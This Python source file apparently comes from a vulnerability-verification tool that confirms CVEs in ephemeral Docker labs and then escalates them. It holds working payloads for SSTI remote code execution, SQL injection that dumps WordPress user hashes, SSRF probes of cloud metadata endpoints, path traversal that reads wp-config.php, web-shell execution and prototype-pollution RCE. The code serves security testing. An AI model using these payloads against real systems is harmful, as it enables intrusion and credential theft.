            f"/wp-content/uploads/2025/{shell_name}",
            f"/uploads/{shell_name}",
            f"/upload/{shell_name}",
            f"/files/{shell_name}",
            f"/media/{shell_name}",
            f"/{shell_name}",
        ]
        # Prioritise URL extracted from upload response JSON — most accurate
        if upload_url_hint:
            _hint_path = upload_url_hint if upload_url_hint.startswith("/") else (
                "/" + upload_url_hint.split("/", 3)[-1]
                if upload_url_hint.startswith("http") else upload_url_hint)
            if _hint_path not in _upload_paths:
                _upload_paths.insert(0, _hint_path)
        # Also derive path from container_path if available
        if container_path:
            # e.g. /var/www/html/wp-content/uploads/shell.php → /wp-content/uploads/shell.php
            for _prefix in ("/var/www/html", "/var/www", "/srv/http", "/app"):
                if container_path.startswith(_prefix):
                    _derived = container_path[len(_prefix):]
                    if _derived not in _upload_paths:
                        _upload_paths.insert(0, _derived)
        step(f"weaponize/file-upload: probando {len(_upload_paths)} rutas para ejecutar shell...")
        for path in _upload_paths:
            try:
                # First check if reachable
                url_check = base_url.rstrip("/") + path
                r = sess.get(url_check, params={"cmd": "id"}, timeout=8, allow_redirects=True)
                if r.status_code == 200:
                    uid_m = _re.search(r'uid=\d+\(([^\)]+)\)', r.text)
                    if uid_m:
                        step(f"weaponize/file-upload: RCE confirmado — {uid_m.group(0)} via {path}")
                        return {
                            "technique": "file_upload_rce",
                            "data": {"shell_path": path, "id_output": uid_m.group(0),
                                     "shell_url": url_check},
                            "impact": (f"File upload RCE confirmed — OS command execution via "
                                       f"{path}: {uid_m.group(0)}"),
                        }
            except Exception:
                continue
    except Exception:
        pass
    return {}


# ---------------------------------------------------------------------------
# Post-verification weaponization for generic HTTP confirm verifier
# ---------------------------------------------------------------------------

def _try_weaponize_generic(
    base_url: str, endpoint: str, method: str,
    query_params: Optional[dict], post_data: Optional[dict],
    hdrs: dict, confirm_string: str, vuln_class: str,
    step: Callable,
) -> dict:
    """After HTTP confirm succeeds, attempt to extract impact evidence.

    Strategies by vuln_class:
    - ssti / template-injection: replace math payload with id-exec payload
    - sql-injection / sqli: try version() extraction via error-based payload
    - path-traversal / lfi / arbitrary-file-read: try /proc/version read
    Returns a dict with 'technique', 'data', 'impact' — empty if nothing lands.
    Never raises.
    """
    _vc = (vuln_class or "").lower().replace("_", "-")
    result: dict = {"technique": "none", "data": {}, "impact": ""}
    try:
        import requests as _req
        sess = _req.Session()

        def _send_weap(params_override: dict = None, data_override: dict = None,
                       new_ep: str = None) -> str:
            ep = new_ep or endpoint
            url = base_url.rstrip("/") + "/" + ep.lstrip("/")
            kw: dict = {"timeout": 12, "headers": hdrs or {}, "allow_redirects": True}
            if method.upper() == "GET":
                kw["params"] = params_override or query_params or {}
            else:
                _ct = (hdrs.get("Content-Type") or hdrs.get("content-type") or "").lower()
                payload = data_override or post_data or {}
                if "application/json" in _ct:
                    kw["json"] = payload
                else:
                    kw["data"] = payload
            r = sess.request(method.upper(), url, **kw)
            return r.text if hasattr(r, "text") else ""

        # --- SSTI / Template injection ---
        if _vc in ("ssti", "template-injection", "server-side-template-injection",
                   "code-injection"):
            # Find which parameter held the SSTI confirm payload (math expr)
            _all_params = dict(query_params or {})
            _all_params.update(post_data or {})
            _ssti_param = None
            _ssti_val = None
            for k, v in _all_params.items():
                if isinstance(v, str) and any(x in v for x in ("{{", "${", "<%=")):
                    _ssti_param = k
                    _ssti_val = v
                    break
            if _ssti_param:
                # Jinja2 / Twig / generic: try to get id output via os.popen
                _rce_payloads = [
                    # Jinja2 (Python) — typical exploit chain
                    ("{{''.__class__.__mro__[1].__subclasses__()[-1].__init__.__globals__"
                     "['__builtins__']['__import__']('os').popen('id').read()}}"),
                    # Twig (PHP) shorthand
                    "{{['id'] | filter('system')}}",
                    # Freemarker (Java)
                    '${\"freemarker.template.utility.Execute\"?new()(\"id\")}',
                    # Velocity (Java)
                    "#set($x=\"\")#set($rt=$x.class.forName(\"java.lang.Runtime\"))"
                    "#set($chr=$x.class.forName(\"java.lang.Character\"))"
                    "#set($str=$x.class.forName(\"java.lang.String\"))"
                    "#set($ex=$rt.getRuntime().exec(\"id\"))$ex.waitFor()",
                ]
                step("weaponize/ssti: probando payloads de ejecucion de comandos...")
                for payload in _rce_payloads:
                    p_override = {_ssti_param: payload}
                    if method.upper() == "GET":
                        body_w = _send_weap(params_override=p_override)
                    else:
                        body_w = _send_weap(data_override=dict(post_data or {}, **p_override))
                    import re as _re
                    uid_m = _re.search(r'uid=\d+\(([^\)]+)\)', body_w)
                    if uid_m:
                        step(f"weaponize/ssti: RCE confirmado — uid={uid_m.group(0)}")
                        return {
                            "technique": "ssti_rce",
                            "data": {"uid_output": uid_m.group(0), "payload": payload[:80]},
                            "impact": f"RCE via SSTI — OS command output: {uid_m.group(0)}",
                        }

        # --- SQL injection: extract DB version ---
        elif _vc in ("sqli", "sql-injection", "blind-sql-injection", "error-based-sqli"):
            _all_params = dict(query_params or {})
            _all_params.update(post_data or {})
            _sq_param = None
            for k, v in _all_params.items():
                if isinstance(v, str) and any(x in v for x in
                                               ("'", '"', "UNION", "union", "SELECT", "--")):
                    _sq_param = k
                    break
            if not _sq_param and _all_params:
                _sq_param = next(iter(_all_params))
            if _sq_param:
                _ver_payloads = [
                    "1' AND extractvalue(1,concat(0x7e,version()))-- -",
                    "1' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(version(),"
                    "FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- -",
                    "1' UNION SELECT NULL,version()-- -",
                    "1' UNION SELECT version(),NULL-- -",
                    "1 AND 1=(SELECT version())",
                    "' || (SELECT version()) || '",
                ]
                step("weaponize/sqli: extrayendo version de base de datos...")
                import re as _re
                for vp in _ver_payloads:
                    p_override = {_sq_param: vp}
                    if method.upper() == "GET":
                        body_w = _send_weap(params_override=dict(_all_params, **p_override))
                    else:
                        body_w = _send_weap(data_override=dict(_all_params, **p_override))
                    ver_m = _re.search(
                        r'(?:~|~>|XPATH syntax error:\'~?)([0-9]+\.[0-9]+\.[^\s<"&\']{1,50})',
                        body_w)
                    if not ver_m:
                        # PostgreSQL: "invalid input syntax" with version in hint
                        ver_m = _re.search(r'PostgreSQL [\d.]+ on [^\s<"&]{5,80}', body_w)
                    if not ver_m:
                        # Generic version pattern
                        ver_m = _re.search(r'(?:MySQL|MariaDB|PostgreSQL|SQLite|MSSQL)'
                                           r'[^\s<"&]{0,10} [\d.]+', body_w, _re.IGNORECASE)
                    if ver_m:
                        db_ver = ver_m.group(0).strip("~>")
                        step(f"weaponize/sqli: version extraida — {db_ver}")
                        # Also attempt user credential dump for full impact
                        _users_impact = ""
                        _user_payloads = [
                            # WordPress: wp_users table dump via UNION
                            ("1' UNION SELECT user_login,user_pass FROM wp_users LIMIT 3-- -",
                             _re.compile(r'([a-zA-Z0-9_]{3,40})\s*[,|]\s*(\$P\$[A-Za-z0-9./]{31})', _re.S)),
                            # Generic: information_schema.tables
                            ("1' UNION SELECT table_name,table_schema FROM "
                             "information_schema.tables LIMIT 5-- -",
                             _re.compile(r'\b(wp_users|users|admin_users|accounts|members)\b', _re.I)),
                            # MySQL: current user
                            ("1' UNION SELECT user(),NULL-- -",
                             _re.compile(r'\b(\w+@[\w.%]+)\b')),
                        ]
                        for _u_pl, _u_pat in _user_payloads:
                            try:
                                p_u = {_sq_param: _u_pl}
                                if method.upper() == "GET":
                                    _u_body = _send_weap(params_override=dict(_all_params, **p_u))
                                else:
                                    _u_body = _send_weap(data_override=dict(_all_params, **p_u))
                                _u_m = _u_pat.search(_u_body)
                                if _u_m:
                                    _users_impact = _u_m.group(0)[:120]
                                    step(f"weaponize/sqli: datos sensibles extraídos — {_users_impact[:60]}")
                                    break
                            except Exception:
                                pass
                        return {
                            "technique": "sqli_data_extraction",
                            "data": {"db_version": db_ver, "payload": vp[:60],
                                     "users_data": _users_impact},
                            "impact": (f"SQLi confirmed — DB version: {db_ver}"
                                       + (f"; data leaked: {_users_impact[:80]}" if _users_impact else "")),
                        }

        # --- SSRF: probe cloud metadata / internal services ---
        elif _vc in ("ssrf", "server-side-request-forgery", "request-forgery"):
            _ssrf_param = None
            _all_params = dict(query_params or {})
            _all_params.update(post_data or {})
            for k, v in _all_params.items():
                if isinstance(v, str) and any(x in v.lower() for x in
                                               ("ssrf_canary", "http://", "https://", "attacker")):
                    _ssrf_param = k
                    break
            if _ssrf_param:
                import re as _re
                _ssrf_targets = [
                    # AWS IMDSv1
                    "http://169.254.169.254/latest/meta-data/",
                    # GCP metadata
                    "http://metadata.google.internal/computeMetadata/v1/instance/",
                    # Azure IMDS
                    "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
                    # localhost services
                    "http://127.0.0.1:80/",
                    "http://127.0.0.1:8080/",
                ]
                step("weaponize/ssrf: probando endpoints cloud metadata y servicios internos...")
                for ssrf_target in _ssrf_targets:
                    p_override = {_ssrf_param: ssrf_target}
                    if method.upper() == "GET":
                        body_w = _send_weap(params_override=dict(_all_params, **p_override))
                    else:
                        body_w = _send_weap(data_override=dict(_all_params, **p_override))
                    if any(x in body_w for x in ("ami-id", "instance-id", "meta-data",
                                                   "computeMetadata", "subscriptionId")):
                        step(f"weaponize/ssrf: metadata de nube extraida via {ssrf_target}")
                        return {
                            "technique": "ssrf_cloud_metadata",
                            "data": {"target_url": ssrf_target,
                                     "response_snippet": body_w[:200]},
                            "impact": (f"SSRF confirmed — cloud metadata endpoint reachable "
                                       f"({ssrf_target}): {body_w[:80]}"),
                        }
                    if body_w and len(body_w) > 20:
                        step(f"weaponize/ssrf: respuesta interna recibida ({ssrf_target})")
                        return {
                            "technique": "ssrf_internal_service",
                            "data": {"target_url": ssrf_target,
                                     "response_snippet": body_w[:200]},
                            "impact": (f"SSRF confirmed — internal service response received "
                                       f"from {ssrf_target}"),
                        }

        # --- Auth bypass: try to access privileged endpoints ---
        elif _vc in ("auth-bypass", "authentication-bypass", "broken-authentication",
                     "missing-authorization", "broken-access-control", "idor"):
            _all_params = dict(query_params or {})
            _all_params.update(post_data or {})
            import re as _re
            _priv_endpoints = [
                "/api/admin/users", "/api/admin/settings", "/api/admin/config",
                "/api/v1/admin/users", "/api/v2/admin/users",
                "/admin/api/users", "/admin/users",
                "/api/users", "/api/settings",
                endpoint,  # already confirmed endpoint
            ]
            step("weaponize/auth-bypass: intentando acceder a endpoints privilegiados...")
            for ep_priv in _priv_endpoints:
                body_w = _send_weap(new_ep=ep_priv)
                if _re.search(r'"(email|username|user_id|id)"\s*:', body_w):
                    step(f"weaponize/auth-bypass: datos de usuario extraidos via {ep_priv}")
                    users_m = _re.findall(r'"(?:email|username)"\s*:\s*"([^"]{3,})"',
                                          body_w)[:3]
                    return {
                        "technique": "auth_bypass_data_extraction",
                        "data": {"endpoint": ep_priv, "users_found": users_m,
                                 "response_snippet": body_w[:200]},
                        "impact": (f"Auth bypass confirmed — user data accessible at {ep_priv}: "
                                   f"found accounts {users_m!r}"),
                    }

        # --- Path traversal / LFI: read /proc/version ---
        elif _vc in ("path-traversal", "lfi", "arbitrary-file-read",
                     "directory-traversal", "file-inclusion"):
            _all_params = dict(query_params or {})
            _all_params.update(post_data or {})
            # Already confirmed /etc/passwd or similar — also fetch /proc/version for more context
            _lfi_param = None
            for k, v in _all_params.items():
                if isinstance(v, str) and any(x in v for x in
                                               ("..", "etc", "passwd", "proc", "%2e")):
                    _lfi_param = k
                    break
            if _lfi_param:
                _extra_files = [
                    # WordPress config (highest impact — exposes DB credentials)
                    "../../../../../../../../var/www/html/wp-config.php",
                    "../../../../../../wp-config.php",
                    "../../../../../wp-config.php",
                    "../../../../../../../../proc/version",
                    "../../../../../../../../etc/hostname",
                    "../../../../../../../../etc/os-release",
                ]
                import re as _re
                step("weaponize/lfi: leyendo archivos del sistema adicionales (incluye wp-config.php)...")
                for fp in _extra_files:
                    fname = fp.rsplit("/", 1)[-1]
                    p_override = {_lfi_param: fp}
                    if method.upper() == "GET":
                        body_w = _send_weap(params_override=dict(_all_params, **p_override))
                    else:
                        body_w = _send_weap(data_override=dict(_all_params, **p_override))
                    if fname == "wp-config.php" and "DB_PASSWORD" in body_w:
                        step("weaponize/lfi: wp-config.php extraido — DB_PASSWORD presente")
                        return {
                            "technique": "lfi_wp_config",
                            "data": {"file": "wp-config.php",
                                     "has_db_password": True,
                                     "snippet": body_w[:200]},
                            "impact": "LFI confirmed — wp-config.php accessible (DB credentials exposed)",
                        }
                    elif fname == "version" and ("Linux version" in body_w or "gcc" in body_w):
                        kver_m = _re.search(r'Linux version [\d.]+[^\n<]{0,80}', body_w)
                        kver = kver_m.group(0) if kver_m else body_w[:100]
                        step(f"weaponize/lfi: kernel version — {kver[:60]}")
                        return {
                            "technique": "lfi_kernel",
                            "data": {"kernel_version": kver, "file": "/proc/version"},
                            "impact": f"LFI confirmed — kernel version: {kver[:60]}",
                        }
                    elif fname == "hostname" and body_w.strip():
                        hostname = body_w.strip()[:64]
                        step(f"weaponize/lfi: hostname extraido — {hostname}")
                        return {
                            "technique": "lfi_hostname",
                            "data": {"hostname": hostname, "file": "/etc/hostname"},
                            "impact": f"LFI confirmed — hostname: {hostname}",
                        }

    except Exception as _we:
        step(f"weaponize: error inesperado — {type(_we).__name__}: {_we}")
    return result


def verify_generic_http_confirm(
    source_dir: str, endpoint: str, http_method: str = "GET",
    confirm_string: str = "", patched_patterns: Optional[List[str]] = None,
    on_step: Optional[Callable[[str], None]] = None,
    budget_s: float = 900.0, custom_headers: Optional[dict] = None,
    post_data: Optional[dict] = None,
    query_params: Optional[dict] = None,
    dockerfile_body: str = "", extra_files: Optional[dict] = None,
    setup_wait_extra_s: float = 0.0,
    setup_commands: Optional[List[str]] = None,
    docker_image: str = "",
    vuln_class: str = "",
    auth_required: bool = True,
) -> WpVerifyResult:
    """Verificador generico de string de confirmacion en respuesta HTTP.

    Usado para CVEs cuya prueba de explotacion se reduce a:
      "enviar peticion X -> si la respuesta contiene confirm_string, vulnerable".

    Ejemplos: Drupal install.php RCE (confirm_string='Choose language'),
    cualquier endpoint cuyo comportamiento vulnerable se detecta con un string
    especifico en la respuesta.

    Parametros:
      confirm_string   - substring que, SI aparece en la respuesta, confirma
                         la vulnerabilidad.
      patched_patterns - lista de strings que, si aparecen, indican un sitio YA
                         parcheado (ej. 'AlreadyInstalled', 'already installed').
      setup_wait_extra_s - segundos adicionales de espera despues del health check
                           (util cuando el Dockerfile hace instalaciones largas).
    """
    import time as _time
    step = on_step or (lambda _m: None)
    res = WpVerifyResult()
    if not _docker_daemon_ok():
        res.available = False
        res.detail = "sin daemon Docker alcanzable"
        res.limitations.append("verificacion dinamica NO intentada: sin daemon Docker")
        return res
    if not confirm_string:
        res.detail = "confirm_string vacia, no se puede confirmar la vulnerabilidad"
        res.limitations.append("se necesita confirm_string para verificar la explotacion")
        return res

    boot = _bootstrap_generic_lab(source_dir, step, res, budget_s,
                                   dockerfile_body=dockerfile_body, extra_files=extra_files,
                                   docker_image=docker_image,
                                   setup_commands=setup_commands)
    if boot is None:
        return res
    lab, base_url, container = boot
    try:
        if setup_wait_extra_s > 0:
            step(f"esperando {setup_wait_extra_s:.0f}s adicionales para que el lab este listo...")
            _time.sleep(setup_wait_extra_s)

        m = (http_method or "GET").upper().strip() or "GET"
        hdrs = dict(custom_headers or {})

        # Auto-auth: if no Authorization/Cookie header was supplied and we know the image,
        # attempt a login using image-specific credentials from app_auth.login_to_app().
        # Skip when auth_required=False (e.g. unauthenticated path traversal — CVE-2026-71209).
        if auth_required and docker_image and not any(k.lower() in ("authorization", "cookie") for k in hdrs):
            try:
                from binoracle.workflows.app_auth import login_to_app as _login_to_app
                _auth_hdrs = _login_to_app(base_url, docker_image, on_step=step)
                if _auth_hdrs:
                    hdrs.update(_auth_hdrs)
            except Exception as _ae:
                step(f"app-auth: error al intentar login automatico — {_ae}")

        url = base_url.rstrip("/") + "/" + endpoint.lstrip("/")
        step(f"enviando {m} {endpoint} buscando confirm_string={confirm_string!r}...")
        try:
            _req_kwargs: dict = {"timeout": 20, "headers": hdrs if hdrs else None}
            if m == "GET" and query_params:
                _req_kwargs["params"] = query_params
            elif post_data:
                _ct = (hdrs.get("Content-Type") or hdrs.get("content-type") or "").lower()
                if "application/json" in _ct:
                    _req_kwargs["json"] = post_data
                else:
                    _req_kwargs["data"] = post_data
            resp = _http_request(m, url, **_req_kwargs)
        except Exception as e:
            res.detail = f"peticion HTTP fallida: {e}"
            return res

        body = resp.text if hasattr(resp, "text") else (resp.get("body") or "")
        # Build searchable text from body + response headers (covers Set-Cookie, Location, etc.)
        _resp_headers = {}
        try:
            _resp_headers = dict(resp.headers) if hasattr(resp, "headers") else {}
        except Exception:
            pass
        _headers_str = " ".join(f"{k}: {v}" for k, v in _resp_headers.items())
        _searchable = body + "\n" + _headers_str

        if patched_patterns and any(pat.lower() in body.lower() for pat in patched_patterns):
            matched = next(p for p in patched_patterns if p.lower() in body.lower())
            res.detail = (f"respuesta contiene patron de parche {matched!r} -> "
                          f"este endpoint ya fue corregido")
            res.evidence = {"respuesta_cuerpo_recorte": body[:500]}
            return res

        if confirm_string.lower() in _searchable.lower():
            res.verified = True
            res.detail = (f"confirm_string {confirm_string!r} encontrado en la respuesta "
                          f"de {m} {endpoint} -- vulnerabilidad confirmada")
            _in_headers = confirm_string.lower() not in body.lower() and confirm_string.lower() in _headers_str.lower()
            res.evidence = {
                "respuesta_cuerpo_recorte": body[:800],
                "confirm_string": confirm_string,
                "confirm_found_in": "headers" if _in_headers else "body",
                "response_headers_snippet": _headers_str[:400] if _in_headers else "",
                "status_code": resp.status_code if hasattr(resp, "status_code") else 200,
                "url": url, "metodo": m,
            }
            _add_exploit_evidence(
                res=res, method=m, url=url, resp_or_body=resp,
                highlight=confirm_string,
                caption_es=(f"VULNERABILIDAD CONFIRMADA: '{confirm_string}' encontrado en "
                            f"respuesta de {m} {endpoint}."),
                caption_en=(f"VULNERABILITY CONFIRMED: '{confirm_string}' found in "
                            f"response of {m} {endpoint}."),
            )
            if vuln_class:
                _wep = _try_weaponize_generic(
                    base_url=base_url, endpoint=endpoint, method=m,
                    query_params=query_params, post_data=post_data,
                    hdrs=hdrs, confirm_string=confirm_string,
                    vuln_class=vuln_class, step=step,
                )
                if _wep.get("impact"):
                    res.evidence["weaponization"] = _wep
            return res

        # Content-Type retry: if POST with one content type returned 400 or no content,
        # retry with the alternate type. Mirrors the same logic in wpverify.py.
        if (confirm_string.lower() not in _searchable.lower() and
                post_data is not None and m not in ("GET", "HEAD")):
            _ct_tried = (hdrs.get("Content-Type") or hdrs.get("content-type") or "").lower()
            _ct_is_json = "application/json" in _ct_tried
            _status_code = getattr(resp, "status_code", 0) if hasattr(resp, "status_code") else 0
            if _status_code == 400 or len((body or "").strip()) <= 20:
                _retry_kwargs: dict = {"timeout": 20, "headers": dict(hdrs)}
                if _ct_is_json:
                    # Retry as form-encoded
                    _retry_kwargs["headers"]["Content-Type"] = "application/x-www-form-urlencoded"
                    _retry_kwargs["data"] = post_data
                else:
                    # Retry as JSON
                    _retry_kwargs["headers"]["Content-Type"] = "application/json"
                    _retry_kwargs["json"] = post_data
                try:
                    _ct_resp = _http_request(m, url, **_retry_kwargs)
                    _ct_body = _ct_resp.text if hasattr(_ct_resp, "text") else ""
                    _ct_headers_str = " ".join(
                        f"{k}: {v}" for k, v in
                        (dict(_ct_resp.headers) if hasattr(_ct_resp, "headers") else {}).items())
                    _ct_searchable = _ct_body + "\n" + _ct_headers_str
                    if confirm_string.lower() in _ct_searchable.lower():
                        step(f"Content-Type retry encontro confirm_string con "
                             f"{'form-encoded' if _ct_is_json else 'JSON'}")
                        resp = _ct_resp
                        body = _ct_body
                        _searchable = _ct_searchable
                except Exception:
                    pass

        # First attempt failed — try up to 2 endpoint format variants without Docker rebuild.
        # Common patterns: trailing slash, no leading slash, /api/ prefix variant.
        _ep_variants: list[str] = []
        ep_stripped = endpoint.strip("/")
        if endpoint.endswith("/"):
            _ep_variants.append("/" + ep_stripped)         # strip trailing slash
        else:
            _ep_variants.append("/" + ep_stripped + "/")  # add trailing slash
        if "?" not in endpoint:
            _ep_variants.append("/" + ep_stripped.split("/")[0])  # parent path

        for _alt_ep in _ep_variants[:2]:
            if _alt_ep == endpoint:
                continue
            _alt_url = base_url.rstrip("/") + "/" + _alt_ep.lstrip("/")
            step(f"reintentando con endpoint alternativo: {_alt_ep}...")
            try:
                _alt_kwargs: dict = {"timeout": 20, "headers": hdrs if hdrs else None}
                if m == "GET" and query_params:
                    _alt_kwargs["params"] = query_params
                elif post_data:
                    _alt_kwargs["data"] = post_data
                _alt_resp = _http_request(m, _alt_url, **_alt_kwargs)
                _alt_body = _alt_resp.text if hasattr(_alt_resp, "text") else ""
                if confirm_string.lower() in _alt_body.lower():
                    res.verified = True
                    res.detail = (f"confirm_string {confirm_string!r} encontrado en la respuesta "
                                  f"de {m} {_alt_ep} -- vulnerabilidad confirmada (endpoint alternativo)")
                    res.evidence = {
                        "respuesta_cuerpo_recorte": _alt_body[:800],
                        "confirm_string": confirm_string,
                        "status_code": _alt_resp.status_code if hasattr(_alt_resp, "status_code") else 200,
                        "url": _alt_url, "metodo": m, "endpoint_alt": _alt_ep,
                    }
                    _add_exploit_evidence(
                        res=res, method=m, url=_alt_url, resp_or_body=_alt_resp,
                        highlight=confirm_string,
                        caption_es=(f"VULNERABILIDAD CONFIRMADA: '{confirm_string}' en {m} {_alt_ep}."),
                        caption_en=(f"VULNERABILITY CONFIRMED: '{confirm_string}' in {m} {_alt_ep}."),
                    )
                    if vuln_class:
                        _wep = _try_weaponize_generic(
                            base_url=base_url, endpoint=_alt_ep, method=m,
                            query_params=query_params, post_data=post_data,
                            hdrs=hdrs, confirm_string=confirm_string,
                            vuln_class=vuln_class, step=step,
                        )
                        if _wep.get("impact"):
                            res.evidence["weaponization"] = _wep
                    return res
            except Exception:
                pass

        res.detail = (f"confirm_string {confirm_string!r} NO encontrado en la respuesta "
                      f"de {m} {endpoint} (len={len(body)})")
        res.evidence = {"respuesta_cuerpo_recorte": body[:300]}
        step(f"confirm_string {confirm_string!r} no encontrado — primeros 300 chars: {body[:300]!r}")
        return res
    except Exception as e:
        res.detail = f"error inesperado en verify_generic_http_confirm: {e}"
        return res
    finally:
        step("desmontando el laboratorio generico...")
        if lab is not None:
            lab.teardown()


def verify_generic_prototype_pollution(
    source_dir: str, endpoint: str, http_method: str = "POST",
    poll_prop: str = "pwned", poll_endpoint: str = "/api/status",
    on_step: Optional[Callable[[str], None]] = None,
    budget_s: float = 900.0,
    dockerfile_body: str = "", extra_files: Optional[dict] = None,
) -> WpVerifyResult:
    """Verifica prototype pollution en Node.js mediante un deepMerge vulnerable.

    Mecanismo:
    1) Levanta el lab efimero con _bootstrap_generic_lab.
    2) Envia POST al endpoint con payload {"__proto__": {"<poll_prop>": "<token>"}}.
    3) Envia GET a poll_endpoint para leer el estado del servidor.
    4) CONFIRMADO si la respuesta de poll_endpoint contiene el token (Object.prototype contaminado).

    poll_prop:     nombre de la propiedad que se inyecta en Object.prototype.
    poll_endpoint: endpoint que expone propiedades del objeto (GET /api/status).
    """
    step = on_step or (lambda _m: None)
    res = WpVerifyResult()
    if not _docker_daemon_ok():
        res.available = False
        res.detail = "sin daemon Docker alcanzable"
        res.limitations.append("verificacion dinamica NO intentada: sin daemon Docker")
        return res

    boot = _bootstrap_generic_lab(source_dir, step, res, budget_s,
                                  dockerfile_body=dockerfile_body, extra_files=extra_files)
    if boot is None:
        return res
    lab, base_url, container = boot
    try:
        import threading as _thr
        from .payload_kb import load_prototype_pollution_paths
        token = _token()
        poll_prop = poll_prop or "binoracle_pwned"

        # Build all pollution path variants from payload_kb
        pp_variants = load_prototype_pollution_paths(marker=token)
        step(f"Prototype pollution: probando {len(pp_variants)} variantes de path (token={token!r})")

        winning_technique = ""
        winning_payload = ""

        for pp in pp_variants:
            pl_json = pp["payload_json"].replace('"polluted"', f'"{token}"').replace("true", f'"{token}"')
            # Also try replacing the marker value with token directly
            if token in pp["payload_json"]:
                pl_json = pp["payload_json"]
            step(f"  probando variante: {pp['path']!r}")
            s1, _, b1 = _http_lab(
                base_url, endpoint, http_method,
                headers={"Content-Type": "application/json"},
                body=pl_json.encode(), timeout=15.0)
            if s1 == 0:
                step(f"  endpoint no responde para variante {pp['path']!r}, continuando...")
                continue
            step(f"  respuesta {s1} para variante {pp['path']!r}")

            # Poll for prototype contamination
            s2, _, b2 = _http_lab(base_url, poll_endpoint, "GET", timeout=10.0)
            body2 = (b2 or b"").decode("utf-8", errors="replace")
            if token in body2:
                winning_technique = pp["path"]
                winning_payload = pl_json
                res.verified = True
                res.ok = True
                res.detail = (f"PROTOTYPE POLLUTION CONFIRMADA via {winning_technique!r}: "
                              f"token {token!r} en {poll_endpoint} — Object.prototype contaminado.")
                step(f"VERIFICADO con variante {winning_technique!r}")
                _add_exploit_evidence(
                    res=res, method=http_method, url=base_url + endpoint,
                    resp_or_body=body2,
                    highlight=token,
                    caption_es=(f"PROTOTYPE POLLUTION CONFIRMADA ({winning_technique}): "
                                f"token {token!r} propagado a Object.prototype."),
                    caption_en=(f"PROTOTYPE POLLUTION CONFIRMED ({winning_technique}): "
                                f"token {token!r} propagated to Object.prototype."),
                )
                res.evidence["pp_technique"] = winning_technique
                res.evidence["pp_payload"] = winning_payload[:300]
                break

        if res.verified:
            # Additional: try concurrent burst to check race-condition amplification
            # Some PP bugs only manifest under concurrent requests (Node.js event loop)
            step("PP verificada — probando amplificacion bajo carga concurrente (barrera x5)")
            _barrier = _thr.Barrier(5, timeout=10)
            _results_lock = _thr.Lock()
            _concurrent_hits = []

            def _pp_fire():
                try:
                    _sess_url = base_url + endpoint
                    import urllib.request as _ur
                    _req = _ur.Request(_sess_url, data=winning_payload.encode(),
                                       headers={"Content-Type": "application/json"},
                                       method=http_method)
                    _barrier.wait(timeout=10)
                    with _ur.urlopen(_req, timeout=10):
                        pass
                    _s, _, _b = _http_lab(base_url, poll_endpoint, "GET", timeout=8.0)
                    _body = (_b or b"").decode("utf-8", errors="replace")
                    if token in _body:
                        with _results_lock:
                            _concurrent_hits.append(True)
                except Exception:
                    pass

            _threads = [_thr.Thread(target=_pp_fire, daemon=True) for _ in range(5)]
            for _t in _threads:
                _t.start()
            for _t in _threads:
                _t.join(timeout=20)
            if _concurrent_hits:
                step(f"PP amplificacion concurrente: {len(_concurrent_hits)}/5 threads confirmaron")
                res.evidence["pp_concurrent_confirmed"] = len(_concurrent_hits)

            # PP → RCE escalation via NODE_OPTIONS gadget (Node.js only)
            # Probe after basic PP confirmed: set env.NODE_OPTIONS on the prototype so the
            # next require() in a child process runs attacker-controlled code.
            _docker_img = getattr(lab, "docker_image", "") or ""
            if "node" in _docker_img.lower() or "express" in _docker_img.lower():
                step("PP verificada en Node.js — intentando escalacion a RCE via NODE_OPTIONS")
                _rce_payloads = [
                    {"__proto__": {"env": {"NODE_OPTIONS": "--require /proc/self/environ"}}},
                    {"__proto__": {"shell": "node", "argv0": "node",
                                   "env": {"NODE_RCE": "1"}}},
                    {"constructor": {"prototype": {"polluted": "rce_check"}}},
                ]
                for _pp_pl in _rce_payloads:
                    try:
                        import json as _json
                        _pp_r = _http_lab(
                            base_url, endpoint, http_method,
                            headers={"Content-Type": "application/json"},
                            body=_json.dumps(_pp_pl).encode(), timeout=15.0)
                        _pp_body = (_pp_r[2] or b"").decode("utf-8", errors="replace") if _pp_r else ""
                        if any(s in _pp_body for s in ("Error:", "at Object.", "node_modules",
                                                        "require(", "process.env")):
                            res.evidence["pp_rce_signal"] = {
                                "payload": str(_pp_pl)[:100],
                                "response_snippet": _pp_body[:200],
                            }
                            step(f"PP→RCE signal detectado: {_pp_body[:80]!r}")
                            break
                    except Exception:
                        pass

        elif not res.verified:
            res.ok = True
            res.detail = (f"prototype pollution no detectada con {len(pp_variants)} variantes: "
                          f"token {token!r} NO encontrado en {poll_endpoint}")
        return res
    except Exception as e:
        res.detail = f"error inesperado en verify_generic_prototype_pollution: {e}"
        return res
    finally:
        step("desmontando el laboratorio generico...")
        if lab is not None:
            lab.teardown()


# ---------------------------------------------------------------------------
# CMS-specific auth helpers (Gitea / Nextcloud / Mattermost)
# ---------------------------------------------------------------------------

def _try_gitea_auth(base_url: str, on_step=None) -> dict:
    """Authenticate against a Gitea instance and return a token dict.

    Gitea REST API: POST /api/v1/users/{user}/tokens with Basic auth.
    Dev user created in Dockerfile: gitea_test / Gitea12345!
    Returns {"bearer": "token <tok>", "headers": {...}} or empty dict.
    """
    import json as _j
    step = on_step or (lambda _m: None)
    _user, _pwd = "gitea_test", "Gitea12345!"
    _base = base_url.rstrip("/")
    # First ensure the dev user exists (Gitea dev env may need registration)
    for _ep in [f"/api/v1/users/{_user}/tokens"]:
        try:
            import base64 as _b64
            _creds = _b64.b64encode(f"{_user}:{_pwd}".encode()).decode()
            _r = _http_request(
                "POST", _base + _ep,
                data=_j.dumps({"name": f"binoracle_{_user}"}),
                headers={"Content-Type": "application/json",
                         "Authorization": f"Basic {_creds}"},
                timeout=8)
            if _r.status_code in (200, 201):
                _d = _j.loads(_r.text or "{}")
                _tok = _d.get("sha1") or _d.get("token") or ""
                if _tok:
                    step(f"  gitea-auth: token via {_ep} → {_tok[:8]}...")
                    return {"bearer": f"token {_tok}",
                            "headers": {"Authorization": f"token {_tok}"}}
        except Exception:
            pass
    return {}


def _try_nextcloud_auth(base_url: str, on_step=None) -> dict:
    """Authenticate against Nextcloud and return a cookie/bearer dict.

    Nextcloud OCS API: GET /ocs/v1.php/cloud/users with Basic auth works
    for most operations.  Returns HTTP Basic header dict for OCS requests.
    Dev user: nc_admin / Admin12345!
    """
    import base64 as _b64
    step = on_step or (lambda _m: None)
    _user, _pwd = "nc_admin", "Admin12345!"
